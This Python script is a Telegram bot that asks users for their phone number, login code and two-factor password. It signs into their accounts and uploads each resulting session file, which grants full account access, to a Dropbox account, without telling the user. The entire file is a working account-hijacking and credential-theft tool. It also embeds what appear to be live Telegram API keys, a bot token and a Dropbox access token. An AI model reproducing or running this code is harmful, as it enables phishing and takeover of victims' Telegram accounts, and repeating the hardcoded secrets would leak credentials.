import os
import asyncio
import dropbox
from telethon import TelegramClient, errors
from telegram import Update, ReplyKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes, ConversationHandler

# ---- Your Telegram API keys ----
API_ID = 28863669  # <-- Replace with your API ID (integer)
API_HASH = "72b4ff10bcce5ba17dba09f8aa526a44"  # <-- Replace with your API HASH (string)

# Your Bot Token from BotFather
BOT_TOKEN = "7403077617:AAHpamE_hj-cuNb2kHECiMjD3oSddO_iR20"

# ---- Dropbox API Integration ----
DROPBOX_ACCESS_TOKEN = "sl.u.AFvm7QegbHXdxURalzdH0cjXAyqaMsDRE64TIj5QTfL2IxtbOUjX7drcTvOYhHeD66CD1zQ877mN1_rAGy0Z-6kQYf8RzHCF48lqKiF5KeVeg03Q1lZXQtS4iGsRmQWLqzyfTygc3RHu7P47bh7v_J2Y96GCHf966AomFTSsZ7SX-KoKS5O1f4ihNJPxi-XfuFBOPSr-EoOr3fqyodbVR0PsEcy4FXyxgm_vS451VUF74zjQaQWEhM8pI1se2Bt2unpNTjEcnt2R_V35UcqCayC7LxZTV69CfEt4IHnuFVCNjubwZuEuEsNPddH-aHnq3qbOQG_ohi-xawGh3Rh62p23ALGxWcLciw0aoJ6lBcM0gI3F1jJ7DXqKshIjqhejCELDBAs7GNDK1-EQslTbfSEouUpKlzH6x77s8XlK7cHXROmoK35nrdl2-3qiX-_PWTSyrpHUJG0ASUjiPZwfmdaf3tURIL-j78cqAYSdNpa2D-xwx_BiuCYesCX6yRWqWKdmpyGxBEvEGBOUv_MTbuvmOeA5AeNLJZ3AI_2DDk2V9kQT4jCgJC9HaaWUj9QvA4M0jqsB-FqUKAO4tWDNhFXG4P32Ch0oeBHviECaNZSK8cJVo8yWIqmdBuOQ8iCNQ5XHXMtRsbcXTy7uKI2Jt5UnWsg0e-q9TMVmO_EULeOnoH1EKkLVnrJNONY1V900aEEXfEDcA_1N1p0713HtjOYILXKjUoIDcYSTWcL2p1gS9mNpULyw1evFDgaW5QjhsBypvvI6yqfWkkCcA0UWSBZ0f6CIcEP-7YJ78A6iOHD7vkMvwV4m-VSK_7xoHO3BQh_6q_yaDW3KQTCB80LwlixJMoAapE4TxwWIU8VFmO-L_b-ynJSOCeR4OhnkD_Lphe4m3fF6O9FCAE3EvZFt0zTcegUEcHIWFDBKRZhTlOkx-IMAz1zpLlfPWwqHryusSG-6ElowlcXCeaSO_ERy3R7PGrzGCdbc_dr6O103Le0OhvtXJMQi26er1TdABmRCaNb1UGrEkrVw5npp7myRUCbuLqy5N_0DvPxq-C5gAX68qyQAQvqE5AIeIMJMUa9zLuLspKxIZOlAhroydXRr5I2h_w9rGVI7mELnCG5tci6DBonicL6KsLkalDHo93yqf42NvkDPZaZVpbnHJweVjjLyio6kEwE7hVwf_oy3bf26Tt8by0xYtZlBN_ei0KKysY8UoOJcBOHlKlr3pULxuiIaO_W-uUF8VkMye5-zGmkUWzeR7ouJlTwNrB34NGzlOD0LLYOf27-PJPSXMn-4zxmwW2yf6SY4etfoYMxU_4CBg_zYcyRhTLwY1W6J43I88adUxDCb2Sgqrzw8vFUtE7pWQOts2w8wTxqH7cMkgZvVOTT8s97BfXtkQsyzCEjNj9vU0WKPJlySGjeGWuLSLep_41lX6Fa_l_q3eb--x81ITmTQ90jKZgu_f9BHz24E8M7eIfuX8JTrKAS2pExvTzPt"  # <-- Replace with your Dropbox access token
dbx = dropbox.Dropbox(DROPBOX_ACCESS_TOKEN)

# ---- States for Conversation ----
ASK_PHONE, ASK_CODE, ASK_PASSWORD = range(3)

# ---- Dictionary to track users' login states ----
user_sessions = {}

# ---- Start Command ----
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("👋 Hello! Send me your phone number (with country code, e.g., +123456789).")
    return ASK_PHONE

# ---- Handle Phone Number ----
async def ask_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    phone = update.message.text.strip()
    user_id = update.message.from_user.id

    # Create a new Telethon client for this user
    session_name = f"sessions/{phone}"  # Saving sessions inside 'sessions' folder
    os.makedirs("sessions", exist_ok=True)
    client = TelegramClient(session_name, API_ID, API_HASH)

    await client.connect()

    try:
        sent = await client.send_code_request(phone)
        user_sessions[user_id] = {"client": client, "phone": phone}
        await update.message.reply_text("📨 OTP code sent! Please send the code you received.")
        return ASK_CODE
    except errors.PhoneNumberInvalidError:
        await update.message.reply_text("❌ Invalid phone number. Please send a valid one.")
        await client.disconnect()
        return ASK_PHONE

# ---- Handle OTP Code ----
async def ask_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    code = update.message.text.strip()

    session = user_sessions.get(user_id)
    if not session:
        await update.message.reply_text("Session expired. Please /start again.")
        return ConversationHandler.END

    client = session["client"]
    phone = session["phone"]

    try:
        await client.sign_in(phone, code)
        await update.message.reply_text("✅ Logged in successfully!")
        
        # Upload session file to Dropbox
        await upload_session_to_dropbox(client, phone)
        
        await client.disconnect()
        return ConversationHandler.END

    except errors.SessionPasswordNeededError:
        await update.message.reply_text("🔒 2FA is enabled. Please send your password.")
        return ASK_PASSWORD

    except errors.PhoneCodeInvalidError:
        # If wrong code, offer retry or skip
        reply_markup = ReplyKeyboardMarkup([["Retry", "Skip"]], one_time_keyboard=True, resize_keyboard=True)
        await update.message.reply_text("❗ Invalid OTP. Retry or Skip?", reply_markup=reply_markup)
        return ASK_CODE

# ---- Handle Retry or Skip ----
async def ask_code_retry(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip().lower()
    if text == "retry":
        await update.message.reply_text("🔁 Okay, please send the code again.")
        return ASK_CODE
    else:
        user_id = update.message.from_user.id
        session = user_sessions.get(user_id)
        if session:
            await session["client"].disconnect()
            user_sessions.pop(user_id, None)
        await update.message.reply_text("⏩ Skipped. Use /start to begin again.")
        return ConversationHandler.END

# ---- Handle 2FA Password ----
async def ask_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    password = update.message.text.strip()

    session = user_sessions.get(user_id)
    if not session:
        await update.message.reply_text("Session expired. Please /start again.")
        return ConversationHandler.END

    client = session["client"]

    try:
        await client.sign_in(password=password)
        await update.message.reply_text("✅ Logged in successfully with 2FA!")

        # Upload session file to Dropbox
        await upload_session_to_dropbox(client, session["phone"])
        
        await client.disconnect()
        return ConversationHandler.END
    except errors.PasswordHashInvalidError:
        await update.message.reply_text("❌ Incorrect password. Please send again.")
        return ASK_PASSWORD

# ---- Upload Session File to Dropbox ----
# ---- Upload Session File to Dropbox ----
async def upload_session_to_dropbox(client, phone):
    """Uploads session file to Dropbox"""
    session_file_path = f"sessions/{phone}.session"  # <-- ADD ".session"
    dropbox_path = f"/sessions/{phone}.session"      # <-- ADD ".session"

    if not os.path.exists(session_file_path):
        print(f"❌ Session file not found for {phone}. Skipping upload.")
        return

    with open(session_file_path, "rb") as f:
        dbx.files_upload(f.read(), dropbox_path, mode=dropbox.files.WriteMode("overwrite"))
        
    print(f"✅ Session file for {phone} uploaded to Dropbox.")


# ---- Cancel Command ----
async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ Operation cancelled. Use /start to begin again.")
    return ConversationHandler.END

# ---- Main Function ----
def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('start', start)],
        states={
            ASK_PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, ask_phone)],
            ASK_CODE: [
                MessageHandler(filters.Regex("^(Retry|Skip)$"), ask_code_retry),
                MessageHandler(filters.TEXT & ~filters.COMMAND, ask_code)
            ],
            ASK_PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, ask_password)],
        },
        fallbacks=[CommandHandler('cancel', cancel)],
    )

    app.add_handler(conv_handler)

    print("Bot running...")
    app.run_polling()

if __name__ == '__main__':
    asyncio.run(main())
